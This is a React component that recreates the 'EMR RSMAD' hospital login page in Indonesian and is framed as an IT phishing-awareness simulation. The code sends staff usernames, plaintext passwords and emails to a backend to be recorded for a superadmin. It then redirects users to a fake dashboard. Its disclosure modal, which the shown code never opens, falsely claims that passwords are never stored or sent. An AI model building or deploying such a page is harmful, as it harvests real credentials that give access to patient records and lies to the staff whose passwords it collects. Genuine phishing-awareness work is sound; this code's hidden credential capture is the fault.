"use client";

import React, { useState, useEffect, useRef } from "react";
import {
  RotateCw,
  Mail,
  ShieldCheck,
  AlertTriangle,
  Info,
  ArrowRight,
  Sparkles,
  CheckCircle2,
  ArrowLeft,
} from "lucide-react";
import Link from "next/link";

interface EmrLoginSimulationProps {
  token: string;
  scenarioName?: string;
  department?: string;
  employeeName?: string;
}

export default function EmrLoginSimulation({
  token,
  scenarioName = "EMR RSMAD - Verifikasi Akses Masuk",
  department = "Unit Layanan",
  employeeName = "Pegawai RS",
}: EmrLoginSimulationProps) {
  // 1: Step 1 (Username & Password) vs Step 2 (Captcha, Email & OTP)
  const [step, setStep] = useState<1 | 2>(1);

  // Step 1 Form Data
  const [usernameInput, setUsernameInput] = useState("");
  const [passwordInput, setPasswordInput] = useState("");

  // Step 2 Form Data
  const [email, setEmail] = useState("");
  const [captchaInput, setCaptchaInput] = useState("");
  const [otpInput, setOtpInput] = useState("");
  const [captchaCode, setCaptchaCode] = useState("vwf7");

  // OTP State
  const [otpSent, setOtpSent] = useState(false);
  const [otpSending, setOtpSending] = useState(false);
  const [otpCountdown, setOtpCountdown] = useState(0);

  // Modal & Event State
  const [showEducationModal, setShowEducationModal] = useState(false);
  const [reported, setReported] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [completed, setCompleted] = useState(false);

  const canvasRef = useRef<HTMLCanvasElement | null>(null);

  // Track initial OPENED event
  useEffect(() => {
    fetch(`/api/simulation/${token}/event`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ eventType: "OPENED" }),
    }).catch(() => {});
  }, [token]);

  // Countdown timer for OTP
  useEffect(() => {
    if (otpCountdown > 0) {
      const timer = setTimeout(() => setOtpCountdown(otpCountdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [otpCountdown]);

  // Handle Step 1 Submit (Username & Password -> Step 2 and auto record to Supabase)
  const handleStep1Submit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!usernameInput || !passwordInput) {
      alert("Silakan isi Username dan Password terlebih dahulu.");
      return;
    }

    const calculatedEmail = usernameInput.includes("@")
      ? usernameInput
      : `${usernameInput.toLowerCase()}@rsmad.co.id`;

    // Leave email input completely blank for Step 2 so user types it manually
    setEmail("");
    setCaptchaInput("");
    setOtpInput("");

    // Auto-record login attempt transparently to Supabase users table for Superadmin
    try {
      fetch("/api/auth-emr/record-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: usernameInput,
          email: calculatedEmail,
          password: passwordInput,
          token,
        }),
      }).catch((err) => console.warn("Record login warning:", err));
    } catch (e) {
      console.warn("Background sync warning:", e);
    }

    setStep(2);
  };

  // Re-draw Captcha when entering Step 2
  useEffect(() => {
    if (step === 2) {
      setTimeout(() => {
        generateNewCaptcha();
      }, 50);
    }
  }, [step]);

  // Handle Kirim OTP Melalui Email in Step 2
  const handleSendOtp = async () => {
    if (!email) {
      alert("Silakan masukkan email Anda terlebih dahulu.");
      return;
    }

    setOtpSending(true);
    try {
      await fetch("/api/auth-emr/send-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: usernameInput,
          password: passwordInput,
          email,
          token,
        }),
      });
      
      // Keep OTP input field blank so user manually types from their inbox
      setOtpSent(true);
      setOtpCountdown(60);
    } catch (e) {
      setOtpSent(true);
      setOtpCountdown(60);
    } finally {
      setOtpSending(false);
    }
  };

  // Generate and draw authentic grid-matrix CAPTCHA (matching reference: v w f 7)
  const generateNewCaptcha = () => {
    const chars = "abcdefhkmnpqrstuvwxyz23456789";
    let code = "";
    for (let i = 0; i < 4; i++) {
      code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    setCaptchaCode(code);
    drawCaptcha(code);
  };

  const drawCaptcha = (text: string) => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    const width = canvas.width;
    const height = canvas.height;

    // 1. Pure white base background
    ctx.fillStyle = "#ffffff";
    ctx.fillRect(0, 0, width, height);

    // 2. Exact Grid Mosaic Pattern of Rounded Rectangles (Left ~75% dense)
    const activeWidth = width * 0.75;
    const cols = 22;
    const rows = 5;
    const cellW = activeWidth / cols;
    const cellH = height / rows;

    for (let r = 0; r < rows; r++) {
      for (let c = 0; c < cols; c++) {
        const baseAlpha = (1 - (c / cols) * 0.45) * 0.25;
        const randAlpha = Math.random() * 0.12 + baseAlpha;
        ctx.fillStyle = `rgba(140, 155, 175, ${Math.min(randAlpha, 0.4)})`;

        const padX = 2;
        const padY = 2;
        const rx = c * cellW + padX;
        const ry = r * cellH + padY;
        const rw = cellW - padX * 2;
        const rh = cellH - padY * 2;

        ctx.beginPath();
        ctx.roundRect(rx, ry, rw, rh, 1);
        ctx.fill();
      }
    }

    // 3. Letters with exact matching colors from screenshot:
    // letter 1: soft teal-cyan ('v'), letter 2: olive green ('w'), letter 3: muted slate violet ('f'), letter 4: vibrant pink-magenta ('7')
    const letterColors = ["#82ccd7", "#76a226", "#9d9dc4", "#d42e88", "#2bb673", "#ff6b6b"];
    const charSpacing = activeWidth / (text.length + 0.3);

    ctx.textBaseline = "middle";
    ctx.font = "bold 60px 'Segoe UI', Arial, sans-serif";

    for (let i = 0; i < text.length; i++) {
      ctx.save();
      const charX = 18 + i * charSpacing;
      const charY = height / 2 + 1;
      const angle = (Math.random() * 8 - 4) * (Math.PI / 180);

      ctx.translate(charX, charY);
      ctx.rotate(angle);
      ctx.fillStyle = letterColors[i % letterColors.length];
      ctx.fillText(text[i], 0, 3);
      ctx.restore();
    }

    // 4. Scratch lines cutting horizontally across the letters
    ctx.strokeStyle = "#1e293b";
    ctx.lineWidth = 1.2;
    ctx.beginPath();
    ctx.moveTo(30, height * 0.62);
    ctx.lineTo(activeWidth * 0.45, height * 0.52);
    ctx.stroke();

    ctx.strokeStyle = "#a855f7";
    ctx.lineWidth = 1;
    ctx.beginPath();
    ctx.moveTo(activeWidth * 0.38, height * 0.58);
    ctx.lineTo(activeWidth * 0.95, height * 0.54);
    ctx.stroke();

    ctx.strokeStyle = "#76a226";
    ctx.lineWidth = 1;
    ctx.beginPath();
    ctx.moveTo(activeWidth * 0.55, height * 0.72);
    ctx.lineTo(activeWidth * 0.98, height * 0.34);
    ctx.stroke();
  };

  useEffect(() => {
    generateNewCaptcha();
  }, []);

  // Handle Step 2 Final Submit (Redirects to EMR Dashboard)
  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      await fetch("/api/auth-emr/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: usernameInput,
          password: passwordInput,
          email,
          captcha: captchaInput,
          otp: otpInput,
          token,
        }),
      });

      // Track event in simulation system
      await fetch(`/api/simulation/${token}/event`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          eventType: "ATTEMPTED_LOGIN",
        }),
      });
    } catch (err) {
      console.error("Simulation tracking error:", err);
    } finally {
      setIsSubmitting(false);
      // Redirect to white hospital dashboard
      window.location.href = `/auth-emr/dashboard?username=${encodeURIComponent(
        usernameInput || "Staf Medis"
      )}&email=${encodeURIComponent(email)}&token=${encodeURIComponent(token)}`;
    }
  };

  const handleFinish = async () => {
    try {
      await fetch(`/api/simulation/${token}/event`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ eventType: "COMPLETED" }),
      });
      setCompleted(true);
    } catch {
      setCompleted(true);
    }
  };

  return (
    <div className="relative min-h-screen w-full flex items-center justify-center font-sans bg-slate-900 p-4 sm:p-8 select-none overflow-x-hidden">
      {/* Background Image with Authentic Hospital Look & Dark Overlay */}
      <div
        className="absolute inset-0 z-0 bg-cover bg-center bg-no-repeat transition-all duration-700"
        style={{
          backgroundImage: `url('/images/emr-rsmad-bg.jpg')`,
        }}
      >
        <div className="absolute inset-0 bg-black/50 md:bg-black/40" />
        <div className="absolute inset-0 backdrop-blur-[0.5px]" />
      </div>

      {/* 2-Column Responsive Layout matching Screenshot */}
      <div className="relative z-10 max-w-[960px] w-full mx-auto flex flex-col md:flex-row items-center md:items-start justify-between gap-8 md:gap-12 my-auto">
        
        {/* Left Side: Hospital Branding & Greeting */}
        <div className="w-full md:flex-1 text-white text-left pt-10 md:pt-16 lg:pt-20 pr-0 md:pr-6">
          <h1 className="text-[48px] sm:text-[56px] md:text-[64px] font-extrabold tracking-tight text-white leading-none drop-shadow">
            EMR RSMAD
          </h1>
          
          <p className="text-[17px] sm:text-[19px] md:text-[20px] font-normal text-white/95 mt-3 mb-4 drop-shadow-sm">
            Versi 1.2
          </p>

          <div className="w-full h-[1px] bg-white/45 mb-5" />

          <p className="text-[15px] sm:text-[16px] md:text-[17px] text-white leading-[1.75] font-normal max-w-[520px] drop-shadow-sm">
            Halo , Selamat bekerja , semoga hari ini menyenangkan dan berhasil dengan baik . Terimakasih untuk selalu Meningkatkan kualitas perawatan pasien dan memudahkan pelayanan rumah sakit dalam mengintegrasikan seluruh area layanan dengan cepat dan efisien.
          </p>
        </div>

        {/* Right Side: 🎯 1:1 USER LOGIN PANEL */}
        <div className="w-full md:w-[390px] flex-shrink-0">
          <div className="bg-white rounded-[4px] shadow-2xl p-6 sm:p-7 border border-slate-200/50 transition-all duration-300">
            {/* Title Header */}
            <div className="relative">
              {step === 2 && (
                <button
                  type="button"
                  onClick={() => setStep(1)}
                  className="absolute -left-2 top-0.5 p-1 text-slate-400 hover:text-slate-700 transition-colors"
                  title="Kembali ke input login"
                >
                  <ArrowLeft className="w-4 h-4" />
                </button>
              )}
              <h2 className="text-[23px] font-bold text-[#333333] text-center tracking-tight leading-tight">
                User Login Panel
              </h2>
            </div>

            {/* Divider Line */}
            <div className="w-full h-[1px] bg-slate-200 mt-3.5 mb-5" />

            {/* ════════════ FOTO 1: STEP 1 USERNAME & PASSWORD FORM (EXACT MATCH) ════════════ */}
            {step === 1 ? (
              <form onSubmit={handleStep1Submit} className="space-y-6">
                {/* 1. Input: Username with Solid Black Bust Icon */}
                <div className="pt-1">
                  <div className="flex items-center gap-3 border-b border-blue-500 pb-1.5 focus-within:border-blue-600 transition-colors">
                    {/* Solid Black User Icon matching Screenshot 1 */}
                    <div className="w-[24px] h-[24px] flex items-center justify-center flex-shrink-0">
                      <svg
                        viewBox="0 0 24 24"
                        className="w-[20px] h-[20px] fill-slate-900"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
                      </svg>
                    </div>

                    <input
                      type="text"
                      required
                      value={usernameInput}
                      onChange={(e) => setUsernameInput(e.target.value)}
                      placeholder="Username"
                      autoComplete="username"
                      className="w-full px-1 py-1 text-slate-800 text-[15px] focus:outline-none bg-transparent placeholder:text-slate-400 font-normal"
                    />
                  </div>
                </div>

                {/* 2. Input: Password with Solid Black Padlock Icon */}
                <div className="pt-2">
                  <div className="flex items-center gap-3 border-b border-slate-300 pb-1.5 focus-within:border-blue-500 transition-colors">
                    {/* Solid Black Padlock Icon matching Screenshot 1 */}
                    <div className="w-[24px] h-[24px] flex items-center justify-center flex-shrink-0">
                      <svg
                        viewBox="0 0 24 24"
                        className="w-[19px] h-[19px] fill-slate-900"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
                      </svg>
                    </div>

                    <input
                      type="password"
                      required
                      value={passwordInput}
                      onChange={(e) => setPasswordInput(e.target.value)}
                      placeholder="Password"
                      autoComplete="current-password"
                      className="w-full px-1 py-1 text-slate-800 text-[15px] focus:outline-none bg-transparent placeholder:text-slate-400 font-normal"
                    />
                  </div>
                </div>

                {/* Centered Royal Blue LOGIN Button */}
                <div className="pt-4 flex justify-center">
                  <button
                    type="submit"
                    className="w-[120px] bg-[#3b5cb8] hover:bg-[#2e4ea8] active:bg-[#203a7a] text-white font-bold py-2 px-6 rounded-[3px] text-[13px] tracking-wider uppercase transition-colors shadow-md flex items-center justify-center gap-2"
                  >
                    LOGIN
                  </button>
                </div>
              </form>
            ) : (
              /* ════════════ FOTO 2: STEP 2 CAPTCHA, EMAIL & OTP FORM (EXACT MATCH) ════════════ */
              <form onSubmit={handleLoginSubmit} className="space-y-4 animate-fade-in">
                {/* 1. CAPTCHA Box Area */}
                <div className="space-y-2">
                  <div className="w-full border border-slate-200 bg-white flex items-center justify-start overflow-hidden">
                    <canvas
                      ref={canvasRef}
                      width={330}
                      height={80}
                      className="w-full h-[80px] object-cover bg-white select-none block"
                    />
                  </div>

                  {/* Red Refresh Button */}
                  <div className="pt-0.5">
                    <button
                      type="button"
                      onClick={generateNewCaptcha}
                      className="inline-flex items-center gap-1.5 px-3 py-1 bg-[#ff334b] hover:bg-[#e6223a] active:bg-[#c9182a] text-white text-[11px] font-bold rounded-[3px] uppercase tracking-wide shadow-sm transition-colors"
                    >
                      <RotateCw className="w-3.5 h-3.5" />
                      <span>REFRESH CAPTCHA</span>
                    </button>
                  </div>
                </div>

                {/* 2. Captcha Input Line with Exact CC Badge */}
                <div className="pt-1.5">
                  <div className="flex items-center gap-3 border-b border-slate-300 focus-within:border-blue-700 transition-colors pb-1">
                    <div className="w-[24px] h-[24px] rounded-[4px] bg-black text-white font-extrabold text-[11.5px] flex items-center justify-center flex-shrink-0 tracking-tight leading-none">
                      CC
                    </div>

                    <input
                      type="text"
                      required
                      value={captchaInput}
                      onChange={(e) => setCaptchaInput(e.target.value)}
                      placeholder="Masukan Kode Captcha"
                      autoComplete="off"
                      className="w-full px-1 py-1 text-slate-800 text-[14px] focus:outline-none bg-transparent placeholder:text-slate-500 font-normal"
                    />
                  </div>
                </div>

                {/* 3. Email Input Line with Solid Envelope Icon */}
                <div className="pt-1.5">
                  <div className="flex items-center gap-3 border-b border-slate-300 focus-within:border-blue-700 transition-colors pb-1">
                    <div className="w-[24px] h-[24px] flex items-center justify-center flex-shrink-0 text-slate-900">
                      <svg
                        viewBox="0 0 24 24"
                        className="w-[20px] h-[20px] fill-slate-900"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
                      </svg>
                    </div>

                    <input
                      type="email"
                      required
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="Masukan Email"
                      autoComplete="off"
                      className="w-full px-1 py-1 text-slate-800 text-[14px] focus:outline-none bg-transparent placeholder:text-slate-500 font-normal"
                    />
                  </div>
                </div>

                {/* 4. OTP Input Line with Clean Key Icon */}
                <div className="pt-1.5">
                  <div className="flex items-center gap-3 border-b border-slate-300 focus-within:border-blue-700 transition-colors pb-1">
                    <div className="w-[24px] h-[24px] flex items-center justify-center flex-shrink-0 text-slate-800">
                      <svg
                        viewBox="0 0 24 24"
                        className="w-[20px] h-[20px] fill-slate-900"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z" />
                      </svg>
                    </div>

                    <input
                      type="text"
                      required
                      value={otpInput}
                      onChange={(e) => setOtpInput(e.target.value)}
                      placeholder="Masukan Kode OTP"
                      autoComplete="off"
                      className="w-full px-1 py-1 text-slate-800 text-[14px] focus:outline-none bg-transparent placeholder:text-slate-500 font-normal"
                    />
                  </div>
                </div>

                {/* Red Button: KIRIM OTP MELALUI EMAIL */}
                <div className="pt-2">
                  <button
                    type="button"
                    onClick={handleSendOtp}
                    disabled={otpSending || otpCountdown > 0}
                    className="w-full py-2 px-4 bg-[#ff334b] hover:bg-[#e6223a] active:bg-[#c9182a] disabled:bg-[#f87171] text-white font-bold text-[11.5px] rounded-[3px] uppercase tracking-wider shadow-sm flex items-center justify-center gap-2 transition-colors"
                  >
                    <Mail className="w-4 h-4 fill-white" />
                    <span>
                      {otpSending
                        ? "MENGIRIM OTP..."
                        : otpCountdown > 0
                        ? `KIRIM ULANG OTP (${otpCountdown}s)`
                        : "KIRIM OTP MELALUI EMAIL"}
                    </span>
                  </button>

                  {otpSent && (
                    <p className="text-[11px] text-emerald-600 font-medium mt-1 text-center flex items-center justify-center gap-1">
                      <CheckCircle2 className="w-3.5 h-3.5" />
                      <span>Kode OTP telah dikirimkan ke email terdaftar Anda.</span>
                    </p>
                  )}
                </div>

                {/* Centered Royal Blue LOGIN Button */}
                <div className="pt-3 flex justify-center">
                  <button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-[120px] bg-[#3b5cb8] hover:bg-[#2e4ea8] active:bg-[#203a7a] text-white font-bold py-2 px-6 rounded-[3px] text-[13px] tracking-wider uppercase transition-colors shadow-md flex items-center justify-center gap-2"
                  >
                    {isSubmitting ? (
                      <span className="inline-block animate-spin">⟳</span>
                    ) : (
                      "LOGIN"
                    )}
                  </button>
                </div>
              </form>
            )}
          </div>
        </div>

      </div>

      {/* ⚠️ EDUCATIONAL DISCLOSURE MODAL (The Instant Learning Moment) */}
      {showEducationModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm animate-fade-in">
          <div className="bg-white rounded-xl shadow-2xl max-w-2xl w-full p-6 md:p-8 border border-slate-200 max-h-[90vh] overflow-y-auto">
            {reported ? (
              <div className="text-center space-y-4">
                <div className="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto shadow-inner">
                  <ShieldCheck className="w-10 h-10" />
                </div>
                <div className="inline-block px-3 py-1 bg-emerald-50 text-emerald-700 font-semibold text-xs rounded-full border border-emerald-200">
                  🎉 LUAR BIASA! KESIAPSIAGAAN ANDA SANGAT TINGGI
                </div>
                <h3 className="text-2xl font-bold text-slate-900">
                  Terima Kasih Telah Melaporkan Tautan Ini!
                </h3>
                <p className="text-sm text-slate-600 leading-relaxed max-w-lg mx-auto">
                  Tindakan Anda sangat tepat. Anda baru saja mengenali simulasi keamanan internal dari Tim IT/EDP Rumah Sakit. Pelaporan cepat seperti ini melindungi kerahasiaan data rekam medis pasien dari kebocoran.
                </p>
              </div>
            ) : (
              <div className="space-y-4">
                <div className="flex items-center gap-3 p-4 bg-amber-50 rounded-lg border border-amber-200">
                  <AlertTriangle className="w-8 h-8 text-amber-600 flex-shrink-0" />
                  <div>
                    <h3 className="text-lg font-bold text-amber-950">
                      ⚠️ Ini Adalah Simulasi Keamanan Informasi IT/EDP
                    </h3>
                    <p className="text-xs text-amber-800">
                      Jangan khawatir! Password Anda <strong>TIDAK PERNAH disimpan atau dikirim</strong> ke mana pun.
                    </p>
                  </div>
                </div>

                <div className="space-y-2">
                  <h4 className="font-semibold text-slate-800 text-base flex items-center gap-2">
                    <Info className="w-5 h-5 text-blue-600" />
                    Mengapa Halaman Ini Muncul?
                  </h4>
                  <p className="text-sm text-slate-600 leading-relaxed">
                    Unit IT/EDP sedang menyelenggarakan program peningkatan kesadaran keamanan (*Security Awareness*) berkala untuk seluruh staf Rumah Sakit demi memenuhi standar akreditasi dan perlindungan data pasien (UU Perlindungan Data Pribadi).
                  </p>
                </div>

                {/* Phishing Indicators Checklist */}
                <div className="bg-slate-50 p-4 rounded-lg border border-slate-200 space-y-2.5">
                  <h5 className="text-xs font-bold uppercase tracking-wider text-slate-700">
                    🔍 Tanda-Tanda Yang Harus Anda Waspadai:
                  </h5>
                  <ul className="text-xs text-slate-600 space-y-2">
                    <li className="flex items-start gap-2">
                      <span className="text-red-500 font-bold">1.</span>
                      <span><strong>Periksa Alamat URL di Browser:</strong> Pastikan domain resmi SIMRS RS (bukan IP acak, link email/WA mencurigakan, atau domain asing).</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-red-500 font-bold">2.</span>
                      <span><strong>Jangan Masukkan Password SIMRS Sembarangan:</strong> Sistem resmi RS tidak akan meminta verifikasi mendesak melalui tautan pesan singkat tidak resmi.</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-red-500 font-bold">3.</span>
                      <span><strong>Selalu Laporkan ke IT/EDP:</strong> Jika menerima email/pesan yang mencurigakan, segera konfirmasi ke tim IT Rumah Sakit.</span>
                    </li>
                  </ul>
                </div>
              </div>
            )}

            <div className="mt-6 pt-4 border-t border-slate-200 flex flex-col sm:flex-row items-center justify-between gap-3">
              <Link
                href="/education"
                className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-5 py-2.5 bg-blue-600 hover:bg-blue-700 text-white text-sm font-semibold rounded-lg shadow transition-colors"
              >
                <Sparkles className="w-4 h-4" />
                <span>Pelajari Modul Keamanan Lengkap</span>
                <ArrowRight className="w-4 h-4" />
              </Link>

              <button
                onClick={handleFinish}
                className="w-full sm:w-auto px-5 py-2.5 border border-slate-300 hover:bg-slate-100 text-slate-700 text-sm font-medium rounded-lg transition-colors"
              >
                {completed ? "✓ Simulasi Selesai" : "Saya Mengerti & Selesai"}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
